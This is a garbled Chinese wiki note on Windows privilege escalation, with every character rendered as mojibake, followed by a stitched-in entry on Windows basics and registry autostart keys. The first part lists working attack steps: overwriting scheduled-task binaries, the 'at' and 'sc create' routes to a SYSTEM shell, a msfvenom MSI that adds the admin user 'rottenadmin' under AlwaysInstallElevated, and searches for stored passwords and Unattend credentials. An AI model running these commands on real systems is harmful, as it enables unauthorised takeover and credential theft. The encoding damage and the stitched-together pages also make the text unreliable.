åœ¨Windowsä¸­å¯ä»¥åˆ©ç”¨è®¡åˆ’ä»»åŠ¡è¦†ç›–åŸæœ‰çš„ç¨‹åºæ¥è¿›è¡Œæ›¿æ¢å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹è®¡ç®—æœºä¸Šçš„è®¡åˆ’ä»»åŠ¡ã€‚font style=color:rgb(31, 35, 40);background-color:rgba(175, 184, 193, 0.2);schtasks /query /fo LIST /v/font ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹æŒ‡å®šç›®å½•çš„æƒé™é…ç½®æƒ…å†µã€‚å¦‚æœæˆ‘ä»¬å¯¹ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡æ‰€åœ¨ç›®å½•å…·æœ‰å†™å…¥æƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨æ¶æ„ç¨‹åºè¦†ç›–æ‰åŸæ¥çš„ç¨‹åºã€‚å½“è®¡åˆ’ä»»åŠ¡ä¸‹æ¬¡æ‰§è¡Œæ—¶ï¼Œå°±ä¼šä»¥é«˜æƒé™è¿è¡Œæ¶æ„ç¨‹åºï¼Œè¿›è€Œå®Œæˆææƒã€‚ font style=color:rgb(31, 35, 40);background-color:rgba(175, 184, 193, 0.2);accesschk.exe -dqv D:test -accepteula/font ç”¨æˆ·æƒé™å‰è¨€åœ¨Windowsä¸­ï¼Œå¯ä»¥ä¸ºç”¨æˆ·å¸æˆ·å’Œç»„åˆ†é…ç‰¹å®šçš„â€œç‰¹æƒâ€ã€‚ è¿™äº›ç‰¹æƒæˆäºˆå¯¹æŸäº›èƒ½åŠ›çš„è®¿é—®æƒã€‚å…¶ä¸­ä¸€äº›èƒ½åŠ›å¯ä»¥ç”¨æ¥å°†æˆ‘ä»¬çš„æ€»ä½“ç‰¹æƒæå‡åˆ°ç³»ç»Ÿçš„æƒé™ã€‚ åˆ—å‡ºç”¨æˆ·æƒé™whoami /all SeImpersonatePrivilegeå¯ä»¥ä½¿ç”¨çƒ‚åœŸè±† SeAssignPrimaryPrivilegeå¯ä»¥ä½¿ç”¨çƒ‚åœŸè±† SeAssignPrimaryPrivilegeå¯ä»¥ä½¿ç”¨çƒ‚åœŸè±† SeBackupPrivilegeæˆäºˆå¯¹æ‰€æœ‰å¯¹è±¡çš„è¯»å–æƒé™ åœ¨ç³»ç»Ÿä¸Šï¼Œä¸ç®¡ä»–ä»¬çš„ACLä½¿ç”¨æ­¤æƒé™ï¼Œç”¨æˆ·å¯ä»¥è®¿é—®æ•æ„Ÿçš„æˆ–è€…ä»æ³¨å†Œè¡¨ä¸­æå–å“ˆå¸Œå€¼ ç„¶åè¿›è¡Œç ´è§£æˆ–ç”¨äºä¼ é€’æ•£åˆ—æ”»å‡»ã€‚ SeRestorePrivilegeSeRestorePrivilegeæˆäºˆå¯¹ç³»ç»Ÿä¸Šæ‰€æœ‰å¯¹è±¡çš„å†™è®¿é—®æƒï¼Œè€Œä¸ç®¡å®ƒä»¬çš„ACLå¦‚ä½•ã€‚ æ»¥ç”¨ç‰¹æƒçš„ä¸‰ç§æ–¹å¼ï¼š ä¿®æ”¹æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶ è¦†ç›–ç³»ç»Ÿè¿›ç¨‹ä½¿ç”¨çš„DLL ä¿®æ”¹æ³¨å†Œè¡¨è®¾ç½® SeTakeOwnershipPrivilegeSeTakeOwnershipPrivilegeå…è®¸ç”¨æˆ·å–å¾—æ‰€æœ‰æƒï¼Œåœ¨å¯¹è±¡ä¸Šï¼ˆå†™å…¥æ‰€æœ‰è€…æƒé™ï¼‰ ä¸€æ—¦æ‚¨æ‹¥æœ‰ä¸€ä¸ªå¯¹è±¡ï¼Œå°±å¯ä»¥ä¿®æ”¹å®ƒçš„ACLå¹¶æˆäºˆä½ è‡ªå·±å†™è®¿é—®æƒé™ ä¸SeRestorePrivilegeä½¿ç”¨çš„æ–¹æ³•ç›¸åŒ å…¶ä»–ç‰¹æƒ(æ›´é«˜çº§) SeTcbPrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeDebugPrivilege (used by getsystem) æŒ‰ç³»ç»Ÿç±»å‹ Windows20002003ã€XPatæœ¬åœ°å‘½ä»¤ææƒåœ¨ Windows2000ã€Windows 2003ã€Windows XP è¿™ä¸‰ç±»ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾å°† Administrators ç»„ä¸‹çš„ç”¨æˆ·æƒé™æå‡åˆ° SYSTEM at æ˜¯ä¸€ä¸ªå‘å¸ƒå®šæ—¶ä»»åŠ¡è®¡åˆ’çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè¯­æ³•æ¯”è¾ƒç®€å•ã€‚é€šè¿‡ at å‘½ä»¤å‘å¸ƒçš„å®šæ—¶ä»»åŠ¡è®¡åˆ’ï¼Œ Windows é»˜è®¤ä»¥ SYSTEM æƒé™è¿è¡Œã€‚å®šæ—¶ä»»åŠ¡è®¡åˆ’å¯ä»¥æ˜¯æ‰¹å¤„ç†ã€å¯ä»¥æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ è¯­æ³•ï¼šat æ—¶é—´ å‘½ä»¤ä¾‹å­ï¼šat 10:45PM calc.exe è¯¥å‘½ä»¤ä¼šå‘å¸ƒä¸€ä¸ªå®šæ—¶ä»»åŠ¡è®¡åˆ’ï¼Œåœ¨æ¯æ—¥çš„ 10:45 å¯åŠ¨ calc.exeã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ â€œinteractiveâ€å¼€å¯ç•Œé¢äº¤äº’æ¨¡å¼ï¼š åœ¨å¾—åˆ°ä¸€ä¸ªsystemçš„cmdä¹‹åï¼Œä½¿ç”¨ taskmgr å‘½ä»¤è°ƒç”¨ä»»åŠ¡ç®¡ç†å™¨ï¼Œæ­¤æ—¶çš„ä»»åŠ¡ç®¡ç†å™¨æ˜¯systemæƒé™ï¼Œç„¶åkillæ‰exploreè¿›ç¨‹ï¼Œå†ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨æ–°å»ºexploreè¿›ç¨‹ï¼Œå°†ä¼šå¾—åˆ°ä¸€ä¸ªsystemçš„æ¡Œé¢ç¯å¢ƒ at é…åˆ msfææƒmsfä¸‹ç”Ÿæˆæœ¨é©¬æ–‡ä»¶ï¼Œè·å–ä¼šè¯ä¹‹åï¼Œç„¶åè¿›å…¥shell atå‘½ä»¤æ‰§è¡Œè¿è¡Œç¨‹åºï¼Œ å†å¼€ä¸ªçª—å£ç›‘å¬è¿™ä¸ªç«¯å£ï¼Œä¸Šçº¿åå³ä¸ºsystem windows 78ã€0308ã€1216scå‘½ä»¤ææƒå…³äºscå‘½ä»¤ï¼š SC æ˜¯ç”¨äºä¸æœåŠ¡æ§åˆ¶ç®¡ç†å™¨å’ŒæœåŠ¡è¿›è¡Œé€šä¿¡çš„å‘½ä»¤è¡Œç¨‹åºã€‚æä¾›çš„åŠŸèƒ½ç±»ä¼¼äºâ€œæ§åˆ¶é¢æ¿â€ä¸­â€œç®¡ç†å·¥å…·â€é¡¹ä¸­çš„â€œæœåŠ¡â€ã€‚ sc Create syscmd binPath= cmd /K start type= own type= interact è¿™ä¸ªå‘½ä»¤çš„æ„æ€æ˜¯åˆ›å»ºä¸€ä¸ªåå« syscmd çš„æ–°çš„äº¤äº’å¼çš„ cmd æœåŠ¡ï¼Œç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°±å¾—åˆ°äº†ä¸€ä¸ªsystemæƒé™çš„cmdç¯å¢ƒï¼š sc start systcmd AlwaysInstallElevatedAlwaysInstallElevated æ˜¯ä¸€ç§å…è®¸éç®¡ç†ç”¨æˆ·ä»¥SYSTEMæƒé™è¿è¡ŒMicrosoft Windowså®‰è£…ç¨‹åºåŒ…ï¼ˆ.MSIæ–‡ä»¶ï¼‰çš„è®¾ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ç¦ç”¨æ­¤è®¾ç½®ï¼Œéœ€ç³»ç»Ÿç®¡ç†å‘˜æ‰‹åŠ¨å¯ç”¨ä»–ã€‚ å¯ä»¥é€šè¿‡æŸ¥è¯¢ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹æ¥è¯†åˆ«æ­¤è®¾ç½®ï¼š [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] â€œAlwaysInstallElevatedâ€=dword:00000001[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] â€œAlwaysInstallElevatedâ€=dword:00000001 ä½¿ç”¨reg queryå‘½ä»¤æŸ¥è¯¢æ˜¯å¦å­˜åœ¨æ¼æ´ C: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedorC: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated å¦‚æœç³»ç»Ÿæ²¡è¿™ä¸ªæ¼æ´ï¼Œå®ƒå°†è¾“å‡ºé”™è¯¯: ERROR: The system was unable to find the specified registry key or value. å¦‚æœå­˜åœ¨æ¼æ´ï¼Œä¸Šé¢å°†è¾“å‡ºä»¥ä¸‹å†…å®¹: ç„¶åæˆ‘ä»¬ä½¿ç”¨msfvenomç”Ÿæˆmsiæ–‡ä»¶ï¼Œè¿›è¡Œææƒ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msimsiexec /quiet /qn /i C:\\programdata\\rotten.msi# /quiet å®‰è£…è¿‡ç¨‹ä¸­ç¦æ­¢å‘ç”¨æˆ·å‘é€æ¶ˆæ¯# /qn ä¸ä½¿ç”¨GUI# /i å®‰è£…ç¨‹åºmsfä¸‹çš„è‡ªåŠ¨æ¨¡å—exploit/windows/local/always_install_elevated Unattended Installsè‡ªåŠ¨å®‰è£…å…è®¸ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨ä¸‹è‡ªåŠ¨å®‰è£…ã€‚è¿™ç§è§£å†³æ–¹æ¡ˆç”¨äºåœ¨æ‹¥æœ‰è¾ƒå¤šé›‡å‘˜å’Œæ—¶é—´ç´§ç¼ºçš„è¾ƒå¤§ å‹ç»„ç»‡ä¸­éƒ¨ç½²ç¨‹åºã€‚å¦‚æœç®¡ç†å‘˜æ²¡æœ‰è¿›è¡Œæ¸…ç†çš„è¯ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªåä¸ºUnattendçš„XMLæ–‡ä»¶æ®‹å­˜åœ¨ç³»ç»Ÿä¸Šã€‚ è¿™ä¸ªXMLæ–‡ä»¶åŒ…å«æ‰€æœ‰åœ¨å®‰è£…ç¨‹åºè¿‡ç¨‹ä¸­çš„é…ç½®ï¼ŒåŒ…æ‹¬ä¸€äº›æœ¬åœ°ç”¨æˆ·çš„é…ç½®ï¼Œä»¥åŠç®¡ç†å‘˜è´¦æˆ·ã€‚ å…¨ç›˜æœç´¢Unattendæ–‡ä»¶æ˜¯ä¸ªå¥½åŠæ³•ï¼Œå®ƒé€šå¸¸ä¼šåœ¨ä»¥ä¸‹ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼š C:\\Windows\\Panther\\ C:\\Windows\\Panther\\Unattend\\ C:\\Windows\\System32\\ C:\\Windows\\System32\\sysprep\\ é™¤äº†Unattend.xmlæ–‡ä»¶å¤–ï¼Œè¿˜è¦ç•™æ„ç³»ç»Ÿä¸­çš„sysprep.xmlå’Œsysprep.infæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¸­éƒ½ä¼šåŒ…å«éƒ¨ç½²æ“ä½œ ç³»ç»Ÿæ—¶ä½¿ç”¨çš„å‡­æ®ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬ææƒã€‚ C:\\Users\\user\\Desktop dir C:*vnc.ini /s /b /c#æˆ–è€…åœ¨åç§°ä¸­åŒ…å«å…³é”®è¯çš„é¡¹ç›®ï¼šC:\\Users\\user\\Desktop dir C:\\ /s /b /c | findstr /sr *password*#æˆ–è€…å¯ä»¥åœ¨æ–‡ä»¶å†…å®¹ä¸­æœç´¢passwordä¹‹ç±»çš„å…³é”®å­—ï¼šC:\\Users\\user\\Desktopfindstr /si password *.txt | *.xml | *.ini#å¯ä»¥æŸ¥è¯¢æ³¨å†Œè¡¨ï¼Œä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²passwordï¼šreg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s åœ¨è¿™äº›æ–‡ä»¶ä¸­é€šå¸¸åŒ…å«ç”¨æˆ·åå’Œå¯†ç ï¼Œå¯†ç ä½¿ç”¨base64ç¼–ç ï¼Œå¹¶ä¸”åœ¨æœ€åä¼šé™„åŠ â€Passwordâ€ï¼Œæ‰€ä»¥çœŸæ­£çš„å¯† ç éœ€è¦å»æ‰æœ€åçš„â€Passwordâ€ã€‚ #msfæ¨¡å—post/windows/gather/enum_unattend ç¬¬ä¸‰æ–¹è½¯ä»¶æ¼æ´ææƒmysqldocker"},{"title":"ç½‘ç»œå®‰å…¨","path":"/wiki/ç¬”è®°/ç½‘ç»œå®‰å…¨.html","content":"ä¸€ï¼ŒWindowsç³»ç»Ÿ1ï¼Œé‡è¦æ–‡ä»¶ä»‹ç»# Program Files è½¯ä»¶ç¨‹åºå­˜æ”¾ç›®å½•ï¼Œ64ä½ç¨‹åºæ–‡ä»¶é»˜è®¤ä¼šå®‰è£…åˆ°è¿™ä¸ªç›®å½•ä¸‹ï¼Œå®‰è£…çš„æ—¶å€™æ˜¯å¯ä»¥è‡ªè¡Œä¿®æ”¹å®‰è£…ç›®å½•çš„ï¼Œå¦‚æœä½ å®‰è£…çš„æŸä¸ªè½¯ä»¶çš„æ—¶å€™ï¼Œæ²¡æœ‰ç‰¹æ„çš„ä¿®æ”¹å®‰è£…è·¯å¾„ï¼Œé‚£ä¹ˆå°±å»è¿™ä¸ªç›®å½•ä¸­æ‰¾# Program Files (x86) 32ä½ç¨‹åºæ–‡ä»¶é»˜è®¤ä¼šå®‰è£…åˆ°è¿™ä¸ªç›®å½•ä¸‹ï¼Œx86æ˜¯x86_32çš„ç®€å†™ï¼Œx64æ˜¯x86_64çš„ç®€å†™# Windows ç³»ç»Ÿç¨‹åºçš„æ ¸å¿ƒç›®å½•#ç”¨æˆ· å¤šç”¨æˆ·æ–‡ä»¶(æ¡Œé¢)ï¼Œç°åœ¨çš„ç³»ç»Ÿéƒ½æ”¯æŒå¤šä¸ªç”¨æˆ·ç™»å½•æ“ä½œï¼Œç³»ç»Ÿä¸ºäº†ä½œåŒºåˆ†ï¼Œå°±åœ¨ç³»ç»Ÿç›˜ä¸ºæ¯ä¸ªç”¨æˆ·åˆ†é…ä¸€ä¸ªé»˜è®¤çš„æ–‡ä»¶å¤¹ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„ç”¨æˆ·ç›®å½•ã€‚ 2.å¼€æœºè‡ªå¯åŠ¨è®¾ç½®# win + r è¾“å…¥ shell:startup å›è½¦ï¼Œæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¤¹(é‡Œé¢éƒ½æ˜¯å¼€æœºè‡ªå¯åŠ¨çš„ç¨‹åºçš„å¿«æ·æ–¹å¼) -----è·¯å¾„å¦‚ä¸‹## C:\\Users\\è‰¾å°¼-aini\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup## æŠŠåº”ç”¨å¿«æ·æ–¹å¼æ‹–åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œå³å¯ 3ï¼ŒæŸ¥çœ‹ç”µè„‘IP åœ°å€## ç»ˆç«¯ ipconfig 4,windowså…±äº«èµ„æº## å…±äº«èµ„æºï¼šæ–‡ä»¶å³å‡»å±æ€§ï¼Œå…±äº«ï¼Œæ·»åŠ  everyone## è®¿é—®èµ„æºï¼š\\\\192.168.1.5\\Tools ## ç›´æ¥å›è½¦ï¼Œå°±å¯ä»¥ç›´æ¥æ‰“å¼€æ–‡ä»¶ï¼ˆå¦‚æœè®¾ç½®è¿‡å¯†ç çš„è¯ï¼Œéœ€è¦ç”¨æˆ·åå’Œå¯†ç ç™»å½•) 5,windowæ³¨å†Œè¡¨## æ‰“å¼€ regedit 5.1 æ³¨å†Œè¡¨æ˜¯ä»€ä¹ˆ Windowsæ“ä½œç³»ç»Ÿç§°ä¹‹ä¸ºç™»å½•æ¡£æ¡ˆã€‚æ˜¯Microsoft Windowsä¸­çš„ä¸€ä¸ªé‡è¦çš„æ•°æ®åº“ï¼Œæ³¨å†Œè¡¨æ˜¯ windowsæ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ ¸å¿ƒæ•°æ®åº“ï¼Œå…¶ä¸­å­˜æ”¾ç€å„ç§å‚æ•°ï¼Œç›´æ¥æ§åˆ¶ç€Windowsçš„å¯åŠ¨ã€ç¡¬ä»¶é©±åŠ¨ç¨‹åºçš„ è£…è½½ä»¥åŠä¸€äº›Windowsåº”ç”¨ç¨‹åºçš„è¿è¡Œï¼Œä»è€Œåœ¨æ•´ä¸ªç³»ç»Ÿä¸­èµ·ç€æ ¸å¿ƒä½œç”¨ã€‚è¿™äº›ä½œç”¨åŒ…æ‹¬äº†è½¯ã€ç¡¬ä»¶çš„ç›¸å…³é… ç½®å’ŒçŠ¶æ€ä¿¡æ¯ï¼Œæ¯”å¦‚æ³¨å†Œè¡¨ä¸­ä¿å­˜æœ‰åº”ç”¨ç¨‹åºå’Œèµ„æºç®¡ç†å™¨å¤–å£³çš„åˆå§‹æ¡ä»¶ã€é¦–é€‰é¡¹å’Œå¸è½½æ•°æ®ç­‰ï¼Œè”ç½‘è®¡ç®— æœºçš„æ•´ä¸ªç³»ç»Ÿçš„è®¾ç½®å’Œå„ç§è®¸å¯ï¼Œæ–‡ä»¶æ‰©å±•åä¸åº”ç”¨ç¨‹åºçš„å…³è”ï¼Œç¡¬ä»¶éƒ¨ä»¶çš„æè¿°ã€çŠ¶æ€å’Œå±æ€§ï¼Œæ€§èƒ½è®°å½•å’Œ å…¶ä»–åº•å±‚çš„ç³»ç»ŸçŠ¶æ€ä¿¡æ¯ï¼Œä»¥åŠå…¶ä»–æ•°æ®ç­‰ã€‚æ³¨å†Œè¡¨ä¸­è¿˜åŒ…å« Windows åœ¨è¿è¡ŒæœŸé—´ä¸æ–­å¼•ç”¨çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼Œ æ¯ä¸ªç”¨æˆ·çš„é…ç½®æ–‡ä»¶ã€è®¡ç®—æœºä¸Šå®‰è£…çš„åº”ç”¨ç¨‹åºä»¥åŠæ¯ä¸ªåº”ç”¨ç¨‹åºå¯ä»¥åˆ›å»ºçš„æ–‡æ¡£ç±»å‹ã€æ–‡ä»¶å¤¹å’Œåº”ç”¨ç¨‹åºå›¾ æ ‡çš„å±æ€§è¡¨è®¾ç½®ã€ç³»ç»Ÿä¸Šå­˜åœ¨å“ªäº›ç¡¬ä»¶ä»¥åŠæ­£åœ¨ä½¿ç”¨å“ªäº›ç«¯å£ã€‚å½“ä¸€ä¸ªç”¨æˆ·å‡†å¤‡è¿è¡Œä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œæ³¨å†Œè¡¨æ ä¾›åº”ç”¨ç¨‹åºä¿¡æ¯ç»™æ“ä½œç³»ç»Ÿï¼Œè¿™æ ·åº”ç”¨ç¨‹åºå¯ä»¥è¢«æ‰¾åˆ°ï¼Œæ­£ç¡®æ•°æ®æ–‡ä»¶çš„ä½ç½®è¢«è§„å®šï¼Œå…¶ä»–è®¾ç½®ä¹Ÿéƒ½å¯ä»¥è¢«ä½¿ ç”¨ã€‚ æ­£å¸¸æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ç‚¹å‡»å¼€å§‹èœå•å½“ä¸­çš„è¿è¡Œï¼Œç„¶åè¾“å…¥regeditæˆ–regedit.exeç‚¹å‡»ç¡®å®šå°±èƒ½æ‰“å¼€ Windowsæ“ä½œç³»ç»Ÿè‡ªå¸¦çš„æ³¨å†Œè¡¨ç¼–è¾‘å™¨äº†ï¼Œå‹æƒ…æ…é‡æé†’ï¼Œæ“ä½œæ³¨å†Œè¡¨æœ‰å¯èƒ½é€ æˆç³»ç»Ÿæ•…éšœï¼Œè‹¥æ‚¨æ˜¯å¯¹ Windowsæ³¨å†Œè¡¨ä¸ç†Ÿæ‚‰ã€ä¸äº†è§£æˆ–æ²¡æœ‰ç»éªŒçš„Windowsæ“ä½œç³»ç»Ÿç”¨æˆ·å»ºè®®å°½é‡ä¸è¦éšæ„æ“ä½œæ³¨å†Œè¡¨ï¼Œå³ä¾¿æ˜¯å¿… é¡»è¦æ“ä½œï¼Œé‚£ä¹ˆä¹Ÿè¦æå‰åšå¥½æ³¨å†Œè¡¨çš„å¤‡ä»½å·¥ä½œã€‚å¦‚æœä¸Šè¿°æ‰“å¼€æ³¨å†Œè¡¨çš„æ–¹æ³•ä¸èƒ½ä½¿ç”¨ï¼Œè¯´æ˜ä½ æ²¡æœ‰ç®¡ç†å‘˜æƒ é™ï¼Œæˆ–è€…æ³¨å†Œè¡¨è¢«é”å®šï¼Œå¦‚æœæ˜¯æ²¡æœ‰æƒé™ï¼Œé‚£ä¹ˆæƒ³åŠæ³•è§£é”æƒé™ã€‚ ç®€å•æ¥è¯´ï¼šæ³¨å†Œè¡¨æ˜¯windowsç³»ç»Ÿæ¥è®°å½•å’Œä¿®æ”¹ç”¨æˆ·è®¾ç½®çš„ï¼Œä¸è®ºæ˜¯è½¯ä»¶è¿˜æ˜¯ç¡¬ä»¶ 5.2 æ³¨å†Œè¡¨ç»“æ„ æ³¨å†Œè¡¨ç”±é¡¹ï¼ˆä¹Ÿå«ä¸»é”®æˆ–ç§°â€œé”®â€ï¼‰ã€å­é¡¹ï¼ˆå­é”®ï¼‰å’Œå€¼æ„æˆã€‚ä¸€ä¸ªé¡¹å°±æ˜¯åˆ†æ”¯ä¸­çš„ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè€Œå­é¡¹å°± æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹å½“ä¸­çš„å­æ–‡ä»¶å¤¹ï¼Œå­é¡¹åŒæ ·å®ƒä¹Ÿæ˜¯ä¸€ä¸ªé¡¹ã€‚ä¸€ä¸ªå€¼åˆ™æ˜¯ä¸€ä¸ªé¡¹çš„å½“å‰å®šä¹‰ï¼Œç”±åç§°ã€æ•°æ®ç±»å‹ä»¥ åŠåˆ†é…çš„å€¼ç»„æˆã€‚ä¸€ä¸ªé¡¹å¯ä»¥æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå€¼ï¼Œæ¯ä¸ªå€¼çš„åç§°å„ä¸ç›¸åŒï¼Œå¦‚æœä¸€ä¸ªå€¼çš„åç§°ä¸ºç©ºï¼Œåˆ™è¯¥å€¼ä¸ºè¯¥ é¡¹çš„é»˜è®¤å€¼ã€‚ åœ¨æ³¨å†Œè¡¨ç¼–è¾‘å™¨ï¼ˆregedit.exeï¼‰ä¸­ï¼Œæ•°æ®ç»“æ„æ˜¾ç¤ºå¦‚ä¸‹ï¼Œå…¶ä¸­ï¼Œcommandé”®æ˜¯opené¡¹çš„å­é¡¹ï¼Œ(é»˜ è®¤)è¡¨ç¤ºè¯¥å€¼æ˜¯é»˜è®¤å€¼ï¼Œå€¼åç§°ä¸ºç©ºï¼Œå…¶æ•°æ®ç±»å‹ä¸ºREG_SZï¼Œæ•°æ®å€¼ ä¸º%systemroot%/system32/notepad.exe%1æ•°æ®ç±»å‹ã€‚ æ³¨å†Œè¡¨çš„æ•°æ®ç±»å‹ä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼šæ˜¾ç¤ºç±»å‹ï¼ˆåœ¨ç¼–è¾‘å™¨ä¸­ï¼‰æ•°æ®ç±»å‹è¯´æ˜ ## REG_SZï¼šå­—ç¬¦ä¸²ï¼šæ–‡æœ¬å­—ç¬¦ä¸² ## REG_MULTI_SZï¼šå¤šå­—ç¬¦ä¸²å€¼ï¼šå«æœ‰å¤šä¸ªæ–‡æœ¬å€¼çš„å­—ç¬¦ä¸² ## REG_BINARYï¼šäºŒè¿›åˆ¶æ•°ï¼šäºŒè¿›åˆ¶å€¼ï¼Œä»¥åå…­è¿›åˆ¶æ˜¾ç¤ºï¼Œ ## REG_DWORDï¼šåŒå­—å€¼ï¼›ä¸€ä¸ª32ä½çš„äºŒè¿›åˆ¶å€¼ï¼Œæ˜¾ç¤ºä¸º8ä½çš„åå…­è¿›åˆ¶å€¼ã€‚ 5.3 è¿œç¨‹æ¡Œé¢æ³¨å†Œè¡¨ä½ç½®## ä½ç½®ï¼šHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server## åŒå‡» fDenyTSConnections 1----- 0 ## 1 -------- è¡¨ç¤ºå…³é—­ 0 -----------è¡¨ç¤ºå¼€å¯ 5.4 æ³¨å†Œè¡¨æ§åˆ¶å¼€å¯è‡ªå¯åŠ¨## HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run## æ‰¾åˆ°å¯¹åº”çš„è‡ªå¯åŠ¨ç¨‹åºåˆ é™¤å°±å¯ä»¥## æˆ‘ä»¬å‘ç°å…¶å®è¿˜æœ‰ä¸€äº›å¼€å¯è‡ªå¯åŠ¨çš„ç¨‹åºåœ¨æ³¨å†Œè¡¨çš„ä¸Šé¢è¿™ä¸ªä½ç½®çœ‹ä¸åˆ°ï¼Œé‚£ä¹ˆå¯ä»¥èƒ½åœ¨å…¶ä»–ä½ç½®## å¦‚ HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ï¼Œå¦‚ä¸‹## å¯¹äºwin10æ¥è®²çš„å¸¸è§ä½ç½®ï¼š ## HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ## HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run ## å…¶ä»–ä½ç½®ï¼šè¿™äº›å¤§è‡´äº†è§£å³å¯ï¼Œåé¢ç”¨åˆ°å“ªä¸ªå°±è¯´å“ªä¸ªã€‚ ## Loadæ³¨å†Œé”®ï¼š ## HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼WindowsNTï¼¼CurrentVersionï¼¼Windowsï¼¼load ## Userinitæ³¨å†Œé”®ï¼š ## HKEY_LOCAL_MACHINEï¼¼SOFTWAREï¼¼Microsoftï¼¼WindowsNTï¼¼CurrentVersionï¼¼Winlogonï¼¼Userinit ##è¿™é‡Œä¹Ÿèƒ½å¤Ÿä½¿ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨åˆå§‹åŒ–ç¨‹åºã€‚é€šå¸¸è¯¥æ³¨å†Œé”®ä¸‹é¢æœ‰ä¸€ä¸ªuserinit.exeï¼Œä½†è¿™ä¸ªé”®å…è®¸æŒ‡å®šç”¨é€—å·åˆ†éš”çš„å¤šä¸ªç¨‹åºï¼Œä¾‹å¦‚â€œuserinit.exe,OSA.exeâ€(ä¸å«å¼•å·)ã€‚ 5.5 å‘½ä»¤è¡Œæ·»åŠ æ³¨å†Œè¡¨é€‰é¡¹## reg add HKEY_CURRENT_USER\\Software\\Valve\\Half-Life\\Settings /v dms /t REG_SZ /d test /f## æ³¨ï¼šreg å‘½ä»¤;add å¢åŠ ; /v é€‰é¡¹; /t ç±»å‹ ;/d å€¼;/f ä¸ç”¨æç¤ºå°±å¼ºè¡Œè¦†ç›–ç°æœ‰æ³¨å†Œè¡¨é¡¹ 6ï¼Œwindowå®‰å…¨ç»„ç­–ç•¥6.1 å®šä¹‰ ç™¾åº¦ç™¾ç§‘ï¼šç»„ç­–ç•¥ï¼ˆè‹±è¯­ï¼šGroup Policyï¼‰æ˜¯å¾®è½¯Windows NTå®¶æ—æ“ä½œç³»ç»Ÿçš„ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒå¯ä»¥æ§åˆ¶ç”¨æˆ· å¸æˆ·å’Œè®¡ç®—æœºå¸æˆ·çš„å·¥ä½œç¯å¢ƒã€‚ç»„ç­–ç•¥æä¾›äº†æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºå’Œæ´»åŠ¨ç›®å½•ä¸­ç”¨æˆ·è®¾ç½®çš„é›†ä¸­åŒ–ç®¡ç†å’Œé… ç½®ã€‚ç»„ç­–ç•¥çš„å…¶ä¸­ä¸€ä¸ªç‰ˆæœ¬åä¸ºæœ¬åœ°ç»„ç­–ç•¥ï¼ˆç¼©å†™â€œLGPOâ€æˆ–â€œLocalGPOâ€ï¼‰ï¼Œè¿™å¯ä»¥åœ¨ç‹¬ç«‹ä¸”éåŸŸçš„è®¡ç®—æœºä¸Š ç®¡ç†ç»„ç­–ç•¥å¯¹è±¡ã€‚ é€šä¿—è§£é‡Šï¼šç»„ç­–ç•¥æ˜¯ä¸€ç»„ç­–ç•¥çš„é›†åˆï¼Œç­–ç•¥å°±æ˜¯åˆ¶å®šçš„è§„åˆ™ã€‚ç»„ç­–ç•¥æ˜¯å°†ç³»ç»Ÿé‡è¦çš„é…ç½®åŠŸèƒ½æ±‡é›†æˆå„ç§é…ç½® 